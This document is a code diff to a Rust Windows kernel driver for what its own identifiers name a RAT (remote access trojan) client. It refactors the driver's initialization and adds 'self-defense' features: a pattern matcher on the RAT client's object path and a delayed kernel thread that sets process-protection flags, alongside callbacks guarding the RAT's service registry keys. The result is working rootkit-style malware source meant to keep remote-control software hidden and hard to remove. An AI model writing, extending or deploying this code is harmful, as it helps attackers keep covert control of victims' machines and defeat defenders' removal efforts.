@@ -4,8 +4,9 @@ use core::sync::atomic::Ordering;
 use core::{mem, ptr, slice};
 
 use aho_corasick::AhoCorasickBuilder;
-use rat_common::kernel::KernelHandoff;
 use rat_common::utils::DropGuard;
+use rat_common::windows::PROCESS_PROTECTED_ACCESS;
+use rat_common::windows::kernel::KernelHandoff;
 use wdk::{self, nt_success};
 use wdk_sys::_MODE::KernelMode;
 use wdk_sys::ntddk::{
@@ -22,8 +23,9 @@ use widestring::{U16CStr, Utf16Str, u16cstr};
 
 use crate::global::{
     CM_REGISTER_CALLBACK_COOKIE, DOS_NAME, MAX_INITIALIZE_ATTEMPTS, OB_REGISTER_CALLBACKS_HANDLE,
-    ORIGINAL_DRIVER_ENTRY_COMPLETED, ORIGINAL_DRIVER_OBJECT, ORIGINAL_DRIVER_UNLOAD, RAT_CLIENT,
-    RAT_CLIENT_OBJ_PATH, RAT_CLIENT_SERVICE_PATH, RAT_CLIENT_SERVICE_REGISTRY,
+    OBJ_PATH_AHO_CORASICK, ORIGINAL_DRIVER_ENTRY_COMPLETED, ORIGINAL_DRIVER_OBJECT,
+    ORIGINAL_DRIVER_UNLOAD, RAT_CLIENT, RAT_CLIENT_OBJ_PATH, RAT_CLIENT_OBJ_PATH_SELF_DEFENSE,
+    RAT_CLIENT_OBJ_PATH_SELF_DEFENSE_FLAG, RAT_CLIENT_SERVICE_PATH, RAT_CLIENT_SERVICE_REGISTRY,
     RAT_CLIENT_SERVICE_REGISTRY_SELF_DEFENSE, SERVICE_REGISTRY_AHO_CORASICK,
 };
 use crate::handlers::registry::cm_register_callback;
@@ -36,7 +38,7 @@ type DriverUnloadFn = unsafe extern "C" fn(driver: PDRIVER_OBJECT);
 
 unsafe extern "C" fn initialize_thread_routine(extra: *mut c_void) {
     let extra = unsafe { Box::from_raw(extra.cast()) };
-    let mut sleep = LARGE_INTEGER { QuadPart: -3000000 };
+    let mut sleep = LARGE_INTEGER { QuadPart: -3000000 }; // 300 ms
 
     for retry in 0..MAX_INITIALIZE_ATTEMPTS {
         info!(
@@ -50,7 +52,7 @@ unsafe extern "C" fn initialize_thread_routine(extra: *mut c_void) {
         }
 
         if initialize(&extra).is_ok() {
-            break;
+            return;
         }
     }
 
@@ -128,6 +130,29 @@ fn drop_file() -> anyhow::Result<()> {
     Ok(())
 }
 
+/// Interpret as a `&[u8]` slice for aho-corasick
+fn u16cstr_to_buf(u16cstr: &U16CStr) -> &[u8] {
+    unsafe {
+        slice::from_raw_parts(
+            u16cstr.as_ptr().cast(),
+            u16cstr.len() * mem::size_of::<u16>(),
+        )
+    }
+}
+
+unsafe extern "C" fn set_protected_flags_thread_routine(_: *mut c_void) {
+    let mut sleep = LARGE_INTEGER {
+        QuadPart: -300000000,
+    }; // 30 seconds
+    let status = unsafe { KeDelayExecutionThread(KernelMode as i8, 0, &mut sleep) };
+    if nt_success(status) {
+        RAT_CLIENT_OBJ_PATH_SELF_DEFENSE_FLAG.store(PROCESS_PROTECTED_ACCESS, Ordering::Release);
+        info!("Set process self-defense flags to 0x{PROCESS_PROTECTED_ACCESS:X}");
+    } else {
+        error!("KeDelayExecutionThread error: 0x{status:X}");
+    }
+}
+
 fn initialize(extra: &KernelHandoff) -> anyhow::Result<()> {
     let mut success = true;
     match drop_file() {
@@ -144,6 +169,25 @@ fn initialize(extra: &KernelHandoff) -> anyhow::Result<()> {
         }
     }
 
+    match AhoCorasickBuilder::new()
+        .ascii_case_insensitive(true)
+        .build([u16cstr_to_buf(RAT_CLIENT_OBJ_PATH_SELF_DEFENSE)])
+    {
+        Ok(ac) => {
+            info!("Constructed Aho-Corasick automaton for object path");
+            let ac = OBJ_PATH_AHO_CORASICK.swap(Box::into_raw(Box::new(ac)), Ordering::AcqRel);
+            if !ac.is_null() {
+                unsafe {
+                    let _ = Box::from_raw(ac);
+                }
+            }
+        }
+        Err(e) => {
+            success = false;
+            error!("Failed to build Aho-Corasick automaton for object path: {e}");
+        }
+    }
+
     match object::ob_register_callbacks(extra) {
         Ok(handle) => {
             info!("Registered object callbacks");
@@ -154,6 +198,21 @@ fn initialize(extra: &KernelHandoff) -> anyhow::Result<()> {
                     ObUnRegisterCallbacks(handle);
                 }
             }
+
+            let status = unsafe {
+                PsCreateSystemThread(
+                    ptr::null_mut(),
+                    THREAD_ALL_ACCESS,
+                    ptr::null_mut(),
+                    ptr::null_mut(),
+                    ptr::null_mut(),
+                    Some(set_protected_flags_thread_routine),
+                    ptr::null_mut(),
+                )
+            };
+            if !nt_success(status) {
+                error!("Cannot create thread to set process protection flags: 0x{status:X}");
+            }
         }
         Err(e) => {
             success = false;
@@ -163,14 +222,10 @@ fn initialize(extra: &KernelHandoff) -> anyhow::Result<()> {
 
     match AhoCorasickBuilder::new()
         .ascii_case_insensitive(true)
-        .build([unsafe {
-            slice::from_raw_parts(
-                RAT_CLIENT_SERVICE_REGISTRY_SELF_DEFENSE.as_ptr().cast(), // interpret as a &[u8] slice for aho-corasick
-                RAT_CLIENT_SERVICE_REGISTRY_SELF_DEFENSE.len() * mem::size_of::<u16>(),
-            )
-        }]) {
+        .build([u16cstr_to_buf(RAT_CLIENT_SERVICE_REGISTRY_SELF_DEFENSE)])
+    {
         Ok(ac) => {
-            info!("Constructed Aho-Corasick automaton");
+            info!("Constructed Aho-Corasick automaton for service registry");
             let ac =
                 SERVICE_REGISTRY_AHO_CORASICK.swap(Box::into_raw(Box::new(ac)), Ordering::AcqRel);
             if !ac.is_null() {
@@ -181,7 +236,7 @@ fn initialize(extra: &KernelHandoff) -> anyhow::Result<()> {
         }
         Err(e) => {
             success = false;
-            error!("Failed to build Aho-Corasick automaton: {e}");
+            error!("Failed to build Aho-Corasick automaton for service registry: {e}");
         }
     }
 
